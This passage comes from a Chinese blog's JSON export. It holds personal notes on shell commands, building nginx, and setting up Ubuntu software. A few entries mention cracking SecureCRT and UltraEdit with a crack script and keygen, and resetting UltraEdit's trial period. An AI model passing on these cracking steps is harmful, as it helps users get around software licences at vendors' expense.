&quot;^-&quot;|wc -l 或 find ./company -type f | wc -l</code></p>\n<h3 id=\"2-查看某文件夹下文件的个数，包括子文件夹里的。\"><a href=\"#2-查看某文件夹下文件的个数，包括子文件夹里的。\" class=\"headerlink\" title=\"2. 查看某文件夹下文件的个数，包括子文件夹里的。\"></a>2. 查看某文件夹下文件的个数，包括子文件夹里的。</h3><p><code>ls -lR|grep &quot;^-&quot;|wc -l</code></p>\n<h3 id=\"3-查看某文件夹下文件夹的个数，包括子文件夹里的。\"><a href=\"#3-查看某文件夹下文件夹的个数，包括子文件夹里的。\" class=\"headerlink\" title=\"3. 查看某文件夹下文件夹的个数，包括子文件夹里的。\"></a>3. 查看某文件夹下文件夹的个数，包括子文件夹里的。</h3><p><code>ls -lR|grep &quot;^d&quot;|wc -l</code></p>\n<h3 id=\"4-按修改先后，列出文件\"><a href=\"#4-按修改先后，列出文件\" class=\"headerlink\" title=\"4. 按修改先后，列出文件\"></a>4. 按修改先后，列出文件</h3><p><code>ls -lt</code></p>\n<h2 id=\"十、tar命令\"><a href=\"#十、tar命令\" class=\"headerlink\" title=\"十、tar命令\"></a>十、tar命令</h2><h3 id=\"1-tar打包文件，exclude选项排除指定文件或目录\"><a href=\"#1-tar打包文件，exclude选项排除指定文件或目录\" class=\"headerlink\" title=\"1. tar打包文件，exclude选项排除指定文件或目录\"></a>1. tar打包文件，exclude选项排除指定文件或目录</h3><p><code>tar zcvf ../fetch-wiki.tar.gz * --exclude=*.txt* --exclude=logs</code></p>\n<h2 id=\"十一、rm命令\"><a href=\"#十一、rm命令\" class=\"headerlink\" title=\"十一、rm命令\"></a>十一、rm命令</h2><h3 id=\"1-删除-开头的文件\"><a href=\"#1-删除-开头的文件\" class=\"headerlink\" title=\"1. 删除 - 开头的文件\"></a>1. 删除 - 开头的文件</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">rm --  -filename</div><div class=\"line\">rm -- ./-filename</div></pre></td></tr></table></figure>\n<h2 id=\"十二、echo命令\"><a href=\"#十二、echo命令\" class=\"headerlink\" title=\"十二、echo命令\"></a>十二、echo命令</h2><h3 id=\"1-echo输出制表符方式\"><a href=\"#1-echo输出制表符方式\" class=\"headerlink\" title=\"1. echo输出制表符方式\"></a>1. echo输出制表符方式</h3><p><code>echo -e &quot;123\\t345&quot;</code></p>\n<h3 id=\"2-shell换行\"><a href=\"#2-shell换行\" class=\"headerlink\" title=\"2. shell换行\"></a>2. shell换行</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"123\\n34\"</span></div></pre></td></tr></table></figure>\n<p><strong>注</strong>：-e 表示特殊处理字符串里的特殊字符。</p>\n<h2 id=\"十三、tail语法\"><a href=\"#十三、tail语法\" class=\"headerlink\" title=\"十三、tail语法\"></a>十三、tail语法</h2><h3 id=\"1-查找特定字符串在文件中出现位置\"><a href=\"#1-查找特定字符串在文件中出现位置\" class=\"headerlink\" title=\"1. 查找特定字符串在文件中出现位置\"></a>1. 查找特定字符串在文件中出现位置</h3><p><code>tail -2000000 catalina.out | cat -n | grep &quot;2014-07-10&quot; | head  -2 (对于出现在文末)</code></p>\n<h2 id=\"十四、shell语法\"><a href=\"#十四、shell语法\" class=\"headerlink\" title=\"十四、shell语法\"></a>十四、shell语法</h2><h3 id=\"1-批量解压zip文件\"><a href=\"#1-批量解压zip文件\" class=\"headerlink\" title=\"1. 批量解压zip文件\"></a>1. 批量解压zip文件</h3><p><code>for z in ./*.zip; do unzip -o $z -d ./peixun-logger ; done;</code></p>\n<h3 id=\"2-判断shell脚本输入参数个数\"><a href=\"#2-判断shell脚本输入参数个数\" class=\"headerlink\" title=\"2. 判断shell脚本输入参数个数\"></a>2. 判断shell脚本输入参数个数</h3><p><code>if [ $# -eq 0 ]; then</code></p>\n<h3 id=\"3-逐行读取文本文件的-shell-脚本\"><a href=\"#3-逐行读取文本文件的-shell-脚本\" class=\"headerlink\" title=\"3. 逐行读取文本文件的 shell 脚本\"></a>3. 逐行读取文本文件的 shell 脚本</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">while read line</div><div class=\"line\">do</div><div class=\"line\">echo $line</div><div class=\"line\">done &lt; $1</div></pre></td></tr></table></figure>\n<h3 id=\"4-for循环\"><a href=\"#4-for循环\" class=\"headerlink\" title=\"4. for循环\"></a>4. for循环</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">for index in &#123;1..31&#125;</div><div class=\"line\">do</div><div class=\"line\">    ……</div><div class=\"line\">done</div></pre></td></tr></table></figure>\n<h3 id=\"5-shell注释\"><a href=\"#5-shell注释\" class=\"headerlink\" title=\"5. shell注释\"></a>5. shell注释</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">:&amp;lt;&amp;lt;comment</div><div class=\"line\">这里是个注释哈。</div><div class=\"line\">comment</div></pre></td></tr></table></figure>\n<h3 id=\"6-获取shell脚本位置-当前脚本目录\"><a href=\"#6-获取shell脚本位置-当前脚本目录\" class=\"headerlink\" title=\"6. 获取shell脚本位置/当前脚本目录\"></a>6. 获取shell脚本位置/当前脚本目录</h3><p>不能解决软链接问题：<code>$(cd &quot;$(dirname &quot;$0&quot;)&quot;; pwd)</code><br>最靠谱，能处理软链接的情况以及source加载脚本的情况：<code>echo $( cd &quot;$( dirname &quot;${BASH_SOURCE[0]}&quot; )&quot; &amp;&amp; pwd )</code></p>\n<h3 id=\"7-查看当前bash-shell版本\"><a href=\"#7-查看当前bash-shell版本\" class=\"headerlink\" title=\"7. 查看当前bash shell版本\"></a>7. 查看当前bash shell版本</h3><p>echo $BASH_VERSION</p>\n<h3 id=\"8-理解-bashrc-和-profile\"><a href=\"#8-理解-bashrc-和-profile\" class=\"headerlink\" title=\"8. 理解 bashrc 和 profile\"></a>8. 理解 bashrc 和 profile</h3><p>参见：<a href=\"https://wido.me/sunteya/understand-bashrc-and-profile\">理解 bashrc 和 profile</a></p>\n<h4 id=\"login-shell-和-no-login-shell\"><a href=\"#login-shell-和-no-login-shell\" class=\"headerlink\" title=\"login shell 和 no-login shell\"></a>login shell 和 no-login shell</h4><p>“login shell” 代表用户登入, 比如使用 “su -“ 命令, 或者用 ssh 连接到某一个服务器上, 都会使用该用户默认 shell 启动 login shell 模式.<br>该模式下的 shell 会去自动执行 /etc/profile 和 ~/.profile 文件, 但不会执行任何的 bashrc 文件, 所以一般再 /etc/profile 或者 ~/.profile 里我们会手动去 source bashrc 文件.<br>而 no-login shell 的情况是我们在终端下直接输入 bash 或者 bash -c “CMD” 来启动的 shell.<br>该模式下是不会自动去运行任何的 profile 文件.</p>\n<h4 id=\"interactive-shell-和-non-interactive-shell\"><a href=\"#interactive-shell-和-non-interactive-shell\" class=\"headerlink\" title=\"interactive shell 和 non-interactive shell\"></a>interactive shell 和 non-interactive shell</h4><p>interactive shell 是交互式shell, 顾名思义就是用来和用户交互的, 提供了命令提示符可以输入命令.<br>该模式下会存在一个叫 PS1 的环境变量, 如果还不是 login shell 的则会去 source /etc/bash.bashrc 和 ~/.bashrc 文件<br>non-interactive shell 则一般是通过 bash -c “CMD” 来执行的bash.<br>该模式下不会执行任何的 rc 文件, 不过还存在一种特殊情况这个我之后详细讲述</p>\n<h4 id=\"bashrc-和-profile-的区别\"><a href=\"#bashrc-和-profile-的区别\" class=\"headerlink\" title=\"bashrc 和 profile 的区别\"></a>bashrc 和 profile 的区别</h4><p>看了之前那么多种状态组合, 最关键的问题是, 究竟 bashrc 和 profile 有什么区别呢?</p>\n<p><strong>profile</strong><br>其实看名字就能了解大概了, profile 是某个用户唯一的用来设置环境变量的地方, 因为用户可以有多个 shell 比如 bash, sh, zsh 之类的, 但像环境变量这种其实只需要在统一的一个地方初始化就可以了, 而这就是 profile.</p>\n<p><strong>bashrc</strong><br>bashrc 也是看名字就知道, 是专门用来给 bash 做初始化的比如用来初始化 bash 的设置, bash 的代码补全, bash 的别名, bash 的颜色. 以此类推也就还会有 shrc, zshrc 这样的文件存在了, 只是 bash 太常用了而已.</p>\n<h3 id=\"9-上条命令是否成功执行\"><a href=\"#9-上条命令是否成功执行\" class=\"headerlink\" title=\"9. 上条命令是否成功执行\"></a>9. 上条命令是否成功执行</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">EXCODE=$?</div><div class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$EXCODE</span>\"</span> == <span class=\"string\">\"0\"</span> ]; <span class=\"keyword\">then</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"O.K\"</span></div><div class=\"line\"><span class=\"keyword\">else</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"NOT O.K\"</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div></pre></td></tr></table></figure>\n<h3 id=\"10-加载配置\"><a href=\"#10-加载配置\" class=\"headerlink\" title=\"10. 加载配置\"></a>10. 加载配置</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">. slave.conf</div><div class=\"line\">source slave.conf</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：slave.conf里的值格式为K=V</p>\n<h3 id=\"11-执行字符串命令\"><a href=\"#11-执行字符串命令\" class=\"headerlink\" title=\"11. 执行字符串命令\"></a>11. 执行字符串命令</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">SLAVE_PID_COMMAND=&quot;ps -ef | grep $SECRET_ID | grep -v grep | awk &apos;&#123;print \\$2&#125;&apos;&quot;</div><div class=\"line\">SLAVE_PID=$(eval $SLAVE_PID_COMMAND)</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：<br>\\$要转义处理执行<br>执行字符串里的命令，使用eval命令<br>获取命令执行结果，可以用$()把命令包里来。</p>\n<h3 id=\"12-获取某文件路径文件名\"><a href=\"#12-获取某文件路径文件名\" class=\"headerlink\" title=\"12. 获取某文件路径文件名\"></a>12. 获取某文件路径文件名</h3><p>basename soft_install/jenkins-job-install/archive/jdk1.7.0_60.tar.gz .tar.gz =&gt; jdk1.7.0_60</p>\n<h2 id=\"十五、find命令\"><a href=\"#十五、find命令\" class=\"headerlink\" title=\"十五、find命令\"></a>十五、find命令</h2><h3 id=\"1-删除所有文件名包含Ulysses-Group的文件\"><a href=\"#1-删除所有文件名包含Ulysses-Group的文件\" class=\"headerlink\" title=\"1. 删除所有文件名包含Ulysses-Group的文件\"></a>1. 删除所有文件名包含Ulysses-Group的文件</h3><p><code>find . -name &quot;*Ulysses-Group*&quot; -exec rm -rf {} \\;</code></p>\n<h2 id=\"十六、其他命令\"><a href=\"#十六、其他命令\" class=\"headerlink\" title=\"十六、其他命令\"></a>十六、其他命令</h2><h3 id=\"1-磁盘格式转换为ntfs-会格式化磁盘\"><a href=\"#1-磁盘格式转换为ntfs-会格式化磁盘\" class=\"headerlink\" title=\"1. 磁盘格式转换为ntfs( 会格式化磁盘 )\"></a>1. 磁盘格式转换为ntfs( 会格式化磁盘 )</h3><p><code>convert X: /fs:ntfs</code></p>\n<h3 id=\"2-命令后台处理\"><a href=\"#2-命令后台处理\" class=\"headerlink\" title=\"2. 命令后台处理\"></a>2. 命令后台处理</h3><p><code>nohup command &amp;</code></p>\n<h3 id=\"3-重启ibus\"><a href=\"#3-重启ibus\" class=\"headerlink\" title=\"3. 重启ibus\"></a>3. 重启ibus</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">killall ibus-daemon</div><div class=\"line\">ibus-daemon -drx</div></pre></td></tr></table></figure>\n<h3 id=\"4-查看用户使用的shell版本\"><a href=\"#4-查看用户使用的shell版本\" class=\"headerlink\" title=\"4. 查看用户使用的shell版本\"></a>4. 查看用户使用的shell版本</h3><p>finger [USERNAME]</p>\n<h3 id=\"5-tee\"><a href=\"#5-tee\" class=\"headerlink\" title=\"5. tee\"></a>5. tee</h3><p>重定向到文件并打印到屏幕</p>\n<p>参见：<a href=\"http://blog.csdn.net/love_gaohz/article/details/8100808\">tee–重定向到文件并打印到屏幕</a></p>"},{"title":"linux安装nginx","date":"2015-12-29T05:58:00.000Z","_content":"\nNginx服务器的安装配置\n\n\n## 一、下载并解压安装包\n下载地址：http://nginx.org/en/download.html\n\n> tar -zxvf nginx-x.x.xx.tar.gz （x.x.xx：为版本号）\n\n\n## 二、编译\n``` shell\ncd nginx-x.x.xx\n./configure --with-http_stub_status_module --prefix=/home/yeshaoting/java/server/nginx/nginx-1.8.0 --without-http_rewrite_module --without-http_gzip_module\n```\n\n## 三、参考文档\n[Nginx服务器的安装配置](http://minitoo.blog.51cto.com/4201040/850654)","source":"_posts/article/linux/linux安装nginx.md","raw":"categories:\n  - 工具软件\ntags:\n  - nginx\n  - ubuntu\ntitle: linux安装nginx\ndate: 2015-12-29 13:58:00\n---\n\nNginx服务器的安装配置\n\n\n## 一、下载并解压安装包\n下载地址：http://nginx.org/en/download.html\n\n> tar -zxvf nginx-x.x.xx.tar.gz （x.x.xx：为版本号）\n\n\n## 二、编译\n``` shell\ncd nginx-x.x.xx\n./configure --with-http_stub_status_module --prefix=/home/yeshaoting/java/server/nginx/nginx-1.8.0 --without-http_rewrite_module --without-http_gzip_module\n```\n\n## 三、参考文档\n[Nginx服务器的安装配置](http://minitoo.blog.51cto.com/4201040/850654)","slug":"article/linux/linux安装nginx","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxt1004f5nbtdxi83qzc","content":"<p>Nginx服务器的安装配置</p>\n<h2 id=\"一、下载并解压安装包\"><a href=\"#一、下载并解压安装包\" class=\"headerlink\" title=\"一、下载并解压安装包\"></a>一、下载并解压安装包</h2><p>下载地址：<a href=\"http://nginx.org/en/download.html\" target=\"_blank\" rel=\"external\">http://nginx.org/en/download.html</a></p>\n<blockquote>\n<p>tar -zxvf nginx-x.x.xx.tar.gz （x.x.xx：为版本号）</p>\n</blockquote>\n<h2 id=\"二、编译\"><a href=\"#二、编译\" class=\"headerlink\" title=\"二、编译\"></a>二、编译</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd nginx-x.x.xx</div><div class=\"line\">./configure --with-http_stub_status_module --prefix=/home/yeshaoting/java/server/nginx/nginx-1.8.0 --without-http_rewrite_module --without-http_gzip_module</div></pre></td></tr></table></figure>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://minitoo.blog.51cto.com/4201040/850654\" target=\"_blank\" rel=\"external\">Nginx服务器的安装配置</a></p>\n","excerpt":"","more":"<p>Nginx服务器的安装配置</p>\n<h2 id=\"一、下载并解压安装包\"><a href=\"#一、下载并解压安装包\" class=\"headerlink\" title=\"一、下载并解压安装包\"></a>一、下载并解压安装包</h2><p>下载地址：<a href=\"http://nginx.org/en/download.html\">http://nginx.org/en/download.html</a></p>\n<blockquote>\n<p>tar -zxvf nginx-x.x.xx.tar.gz （x.x.xx：为版本号）</p>\n</blockquote>\n<h2 id=\"二、编译\"><a href=\"#二、编译\" class=\"headerlink\" title=\"二、编译\"></a>二、编译</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">cd nginx-x.x.xx</div><div class=\"line\">./configure --with-http_stub_status_module --prefix=/home/yeshaoting/java/server/nginx/nginx-1.8.0 --without-http_rewrite_module --without-http_gzip_module</div></pre></td></tr></table></figure>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://minitoo.blog.51cto.com/4201040/850654\">Nginx服务器的安装配置</a></p>\n"},{"title":"ubuntu装机软件","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n修改软件源为163的源。\n\n\n## 一、应用软件\n\n### 1. 安装vim\n命令：\n> sudo apt-get install vim\n\n\n### 2. chrome\n直接登录官方网站下载deb包。\nhttps://www.google.com/intl/zh-CN/chrome/browser/\n\n**注**：由于访问google需要翻墙，可以暂时下载百度网盘里的旧版本。\n\n\n### 3. 截图工具shutter\nubuntu软件中心可下载。\n\n14.04的shutter不提供自定义快捷键，可以利用系统自带的键盘快捷键设置来达到目的。\n\n**设置自定义快捷键方法**：设置 -> 键盘 -> 快捷键 -> 自定义快捷键\n\n命令：\n> shutter -s\n\n**注**：系统自带的截图工具也不错。\n\n\n<!-- more -->\n\n### 4. unity-tweak-tool\nunity桌面配置工具, ubuntu软件中心可下载。\n\n命令：\n> sudo apt-get install unity-tweak-tool\n\n\n### 5. 极点五笔输入法\n使用系统自带的极点五笔输入法\n14.04的ibus与系统软件捆绑，ibus坏了，可能导致系统崩溃。慎装，更加不要做任何删除ibus操作。\n\n\n### 6. 安装gnome-panel\ngnome面板工具，包含 **gnome-desktop-item-edit** 命令，用于创建桌面图标。\n\n命令：\n> sudo apt-get install gnome-panel\n\n例如：\n> `gnome-desktop-item-edit ~/Desktop/ --create-new`\n> gnome-desktop-item-edit ~/Desktop/app.desktop\n\n\n### 7. 百度准入go-bnac\n百度网盘里应该有。\n在百度工作专用，用于linux环境下连接百度准入。\n\n\n### 8. bcompare\n安装包，百度网盘有。\n**注**：依赖ia32-libs\n\n\n### 9. RabbitVCS\n安装步骤：\n> sudo add-apt-repository ppa:rabbitvcs/ppa\n> sudo apt-get update\n> sudo apt-get install rabbitvcs-core rabbitvcs-cli rabbitvcs-nautilus3 rabbitvcs-gedit\n\n**说明**：重启文档管理器，使用rabbitvcs-nautilus3生效。\n> nautilus -q\n\n**注**：不同的系统版本可能需要替换 rabbitvcs-nautilus3 为 rabbitvcs-nautilus 。另外，rabbitvcs-gedit 如无需要的话，可以不安装。\n\n**参考**：[ubuntu软件—RabbitVCS : TortoiseSVN 的替代者][^1]\n\n\n### 10. VPN工具\n优先使用cisco Anyconnect VPN Tool。\n\n如果连接不成功，则可以考虑安装openconnect。\n安装命令：\n> sudo apt-get install network-manager-openconnect-gnome\n\n连接VPN命令：\n> sudo openconnect vpn.sohu-inc.com\n\n\n### 11. 右键在当前位置打开终端\n命令：\n> sudo apt-get install nautilus-open-terminal\n\n**注**：安装完成后，需要重启文件管理器\n> nautilus -q\n\n\n### 12. 设置chrome代理\n**百度工作**：使用chrome插件 **Proxy SwitchySharp** 加载公司代理配置。\n**搜狐工作**：购买红杏网页浏览代理服务，并下载红杏chrome插件使用。\n\n\n### 13. ubuntu打印机\n**百度工作**：\n参考http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA\n\n\n### 14. 经典菜单classicmenu-indicator\nubuntu软件中心有下载。\n\n命令：\n> `sudo apt-get install --fix-missing classicmenu-indicator`\n\n\n### 15. rar/zip格式压缩工具\n压缩&解压功能，能与ubuntu自带的归档管理器集成。\n\n安装命令：\n> sudo apt-get install rar unrar p7zip-full\n\n卸载命令：\n> sudo apt-get remove rar unrar p7zip-full\n\n\n### 16. chmsee\n命令：\n> sudo apt-get install chmsee\n\n软件源里可能没有chmsee，网上有已经打包好的deb包。\n**注**：由于ubuntu14.04软件库未提供命令下载，网上有已经打包好的deb包。百度网盘里有下载好的64位chmsee：chmsee_1.3.1.1-1~getdeb2_amd64.deb\n\n**参考**：[chmsee_1.3.1.1-1~getdeb2_amd64.deb][^2]\n\n\n### 17. virtualbox\n命令：\n> sudo apt-get install virtualbox-qt\n\n\n### 18. LONGENE QQ2013\n**前提条件**：64位系统需要安装ia32-libs\n\n安装步骤：\n> deb http://archive.ubuntu.com/ubuntu/ raring main restricted universe multiverse\n> sudo apt-get update\n> sudo apt-get install ia32-libs\n> sudo dpkg -i WineQQ2013-20131120-Longene.deb\n\n**注**：WineQQ2012-20121221-Longene.deb已经不让用，而新版本WineQQ2013SP6-20140102-Longene.deb界面又有问题。可以考虑使用webqq + 虚拟机的方式工作。\n\n**参考**：[wine qq 2013 for linux Ubuntu 64位兼容][^3]\n\n\n### 19. markdown编辑器haroopad\n**下载地址**：http://pad.haroopress.com/user.html\n\n\n### 20. wps-office\n**下载地址**：http://linux.wps.cn/\n\n安装字体管理器命令：\n> sudo apt-get install font-manager\n\n**注**：字体安装有问题，过程可能需要执行exe程序，比较坑，建议不使用需要的字段。(使用过程不会报错)\n\n\n### 21. 有道词典\n**下载地址**：http://cidian.youdao.com/index-linux.html\n\n**说明**：\n使用过程发现会系统出现卡顿的现象。所以，不使用时，最好关闭客户端。\n英文发音有问题。\n\n\n### 22. flashplayer独立播放器\n**下载地址**：http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz\n\n\n### 23. 切换默认的shell版本\n> sudo dpkg-reconfigure dash\n\n**参考**：[Shell编程笔记——Syntax error: \"(\" unexpected][^5]\n\n\n### 24. 百度网盘linux版\nDebian及基于Debian的发行版(比如ubuntu, linuxmint)请直接下载 bcloud-x.x.x.deb这个包, 然后双击deb包就能安装了;\n有些用户并没有安装apt包管理器的GUI界面, 也可以在终端里面安装:\n> $ sudo dpkg -i bcloud-x.x.x.deb\n> $ sudo apt-get -f install\n\n**参考**：\nhttps://github.com/LiuLang/bcloud\nhttps://github.com/LiuLang/bcloud-packages\n\n\n### 25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)\n> sudo aptitude install ttf-wqy-microhei\n\n**参考**：[Ubuntu 14.04 64位字体美化(使用文泉驿微黑)][^6]\n\n\n### 26. 安装gstreamer0.10-ffmpeg\n``` shell\nsudo add-apt-repository ppa:mc3man/trusty-media\nsudo apt-get update\nsudo apt-get install gstreamer0.10-ffmpeg\n```\n\n**参考**：[Ubuntu 14.04如何轻松启用H.264视频支持][11]\n\n\n\n### 27. 安装curl\n> sudo apt-get install curl\n\n\n\n## 二、开发软件\n\n### 1. 安装git\n命令：\n> sudo apt-get install git\n\n\n### 2. securecrt\nsecurecrt(使用securecrt_linux_crack.pl破解时，需要切换到root用户操作：su root)\n\n\n### 3. subversion\n**注**：可能安装rabbitvcs时已经安装\n\n命令：\n> sudo apt-get install subversion\n> sudo apt-get install libapache2-svn\n\n\n### 4. 安装mysql\n命令：\n> sudo apt-get install mysql-server\n> sudo apt-get install mysql-workbench\n\n\n### 5. java\n下载jdk bin或者tar.gz包，并安装。\n\n修改java配置 ~/.profile\n``` shell\nJAVA_HOME=/home/yeshaoting/java/jdk/jdk1.7.0_51\nCLASSPATH=$JAVA_HOME/jre/lib\nPATH=$PATH:$JAVA_HOME/bin\nexport JAVA_HOME CLASSPATH PATH\n```\n\n\n### 6. eclipse／STS\n**最新的STS下载地址**：http://spring.io/tools/sts/\n\n\n### 7. maven\n\n\n## 三、系统配置\n\n### 1. 设置root密码\n命令：\n> sudo passwd root\n\n\n### 2. 合上笔记本不休眠\n编辑/etc/default/acpi-support\n找到内容：LOCK_SCREEN=true，并修改为：LOCK_SCREEN=false\n\n\n### 3. 中文语言支持\n\n\n### 4. 用户目录英文名\n中文ubuntu里用户目录里的路径改成英文\n\n执行命令：\n> export LANG=en_US\n> xdg-user-dirs-gtk-update\n\n接下来，会跳出对话框询问：是否将目录转化为英文路径，同意并关闭。\n在终端中输入命令：export LANG=zh_CN\n关闭终端，并重起。下次进入系统，系统会提示是否把转化好的目录改回中文。\n选择不再提示，并取消修改。\n主目录的中文转英文就完成了~\n\n\n### 5. 自动挂载windows分区\n查看硬盘的分区情况：\n`df -h` 或者 `sudo fdisk -l` 或者使用GParted分区编辑器查看。\n\n编辑/etc/fstab文件，添加如下内容：\n``` shell\n# auto mount C disk\n/dev/sda1 /home/yeshaoting/windows/C ntfs-3g defaults,locale=zh_CN.UTF-8,umask=022 0 0\n\n# auto mount D disk\n/dev/sda5 /home/yeshaoting/windows/D ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0\n\n# auto mount E disk\n/dev/sda6 /home/yeshaoting/windows/E ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0\n```\n\n**说明**：umask=022表示只读，umask=0表示可读写，uid和gid设置所属权限（可以通过id username命令）。\n\n\n### 6. Eclipse设置 Javadoc背景色\n命令：\n> cd /usr/share/themes/Ambiance/gtk-2.0\n> sudo gedit gtkrc\n\n最终12.04及14.04修改gtkrc文件内容如下：\n``` shell\ngtk-color-scheme = \"base_color:#C7EDCC\\nfg_color:#4c4c4c\\ntooltip_fg_color:#000000\\nselected_bg_color:#f07746\\nselected_fg_color:#FFFFFF\\ntext_color:#3C3C3C\\nbg_color:#f6f4f2\\ntooltip_bg_color:#f2edbc\\nlink_color:#DD4814\"\n```\n\n**参考**：[Ubuntu 12.04 Eclipse设置 Javadoc背景色][^4]\n\n\n### 7. thundbird exchange插件ExQuilla\n\n\n\n## 四、软件储备\n\n### 1. Ubuntu下的阿里旺旺软件\n阿里旺旺的 Ubuntu 下的版本，下载地址是：http://ge.tt/8sPpGIA\n**注**：百度网盘里有。\n\n如遇无法登陆的情况，解除登陆限制即可。\n\n**参考**：http://wowubuntu.com/aliwangwang.html\n\n\n### 3.UltraEdit\n下载页面：http://www.ultraedit.com/downloads/uex.html\n下载地址：http://www.ultraedit.com/files/uex/Ubuntu/\n**注**：百度网盘里有。\n\n#### 关于破解\n1. 下载破解器：keygen_ue(百度网盘里有)\n2. 删除配置目录：~/.idm/uex/uex.conf\n\n**参考**：\n[UltraEdit for Linux破解][^7]\n[UltraEdit for linux 不断试用30天的方法 ][^8]\n\n\n### 4. UltraCompareX\n下载页面：http://www.ultraedit.com/downloads/ucx.html\n下载地址：http://www.ultraedit.com/files/ucx/Ubuntu/\n\n**注**：百度网盘里有。\n\n\n### 5. 飞鸽传书GNU/Linux版\n命令：\n> sudo apt-get install iptux\n\n下载地址：https://code.google.com/p/iptux/downloads/list\n\n**参考**：[信使][^10]\n\n\n### 6. winusb\n安装命令：\n``` shell\nsudo add-apt-repository ppa:colingille/freshlight\nsudo apt-get update\nsudo apt-get install winusb\n```\n\n**参考**：[WinUSB][^9]\n\n\n### 7. kwplayer\n需要下载 python3-xlib_xx.deb, python3-keybinder_xx.deb, kwplayer_xx.deb 这 三个软件包. 直接双击就能安装deb包.\n先安装python3-xlib, 之后是python3-keybinder, 最后是kwplayer.\n当然, 也可以在终端里安装, 比如:\n``` shell\nsudo dpkg -i kwplayer_xx.deb\nsudo apt-get -f install\n```\n\n**参考**：\nhttps://github.com/LiuLang/kwplayer\nhttps://github.com/LiuLang/kwplayer-packages\n\n\n### 8. Folder Color\n该软件已经集成到Ubuntu 15.04默认库中。\nubuntu14或ubuntu12想要安装此软件的话，需要额外添加软件库。\n\n安装命令如下：\n``` shell\nsudo add-apt-repository ppa:costales/folder-color\nsudo apt-get update\nsudo apt-get install folder-color\nnautilus -q\n```\n\n**参考**：[Folder Color 已添加到 Ubuntu 15.04 默认库中][^12]\n\n\n### ubuntu截图默认保存位置\n**参考**：[Default save directory for gnome-screenshot?][^13]\n\n\n\n[^1]: http://www.elain.org/?p=742\n[^2]: http://pkgs.org/ubuntu-14.04/getdeb-apps-amd64/chmsee_1.3.1.1-1~getdeb2_amd64.deb.html\n[^3]: http://www.longene.org/forum/viewtopic.php?t=4700\n[^4]: http://blog.csdn.net/qxb1229/article/details/8265616\n[^5]: http://blog.csdn.net/breeze5428/article/details/27353583\n[^6]: http://blog.csdn.net/tao_627/article/details/24180781\n[^7]: http://mjzhou.com/?p=158\n[^8]: http://blog.itpub.net/12216142/viewspace-708801\n[^9]: http://wiki.deepin.org/index.php?title=WinUSB\n[^10]: http://wiki.deepin.org/index.php?title=%E4%BF%A1%E4%BD%BF\n[^11]: http://imcn.me/html/y2014/19624.html\n[^12]: http://imcn.me/html/y2015/23176.html\n[^13]: http://askubuntu.com/a/134469\n","source":"_posts/article/linux/ubuntu装机软件.md","raw":"categories:\n  - 工具软件\ntags:\n  - ubuntu\n  - 装机\n  - 小记\ntitle: ubuntu装机软件\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n修改软件源为163的源。\n\n\n## 一、应用软件\n\n### 1. 安装vim\n命令：\n> sudo apt-get install vim\n\n\n### 2. 